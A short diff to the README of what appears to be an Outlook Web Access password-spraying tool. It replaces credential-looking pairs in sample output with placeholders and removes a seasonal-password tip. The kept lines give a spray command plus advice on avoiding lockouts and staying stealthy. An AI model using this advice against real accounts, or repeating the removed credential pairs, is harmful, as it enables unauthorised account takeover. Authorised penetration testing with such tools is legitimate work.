@@ -76,8 +76,8 @@ python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwo
   Threads : 5
 ==================================================
 
-  [+] VALID: CORP\ahope:Summer2025
-  [1337/15912] 1 hits, 0 errors | 3.2/s | tquinn:Welcome2023
+  [+] VALID: CORP\testuser:testpassword
+  [1337/15912] 1 hits, 0 errors | 3.2/s | admin:password
 
 ==================================================
   Results
@@ -98,7 +98,6 @@ python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwo
 - Keep threads at **5-10** to avoid account lockout
 - Use `--delay` for lockout-sensitive environments
 - Spray **one password at a time** across all users for stealth
-- Common OWA password patterns: `Season+Year+!` (e.g., `Summer2025!`)
 
 ## Disclaimer
 
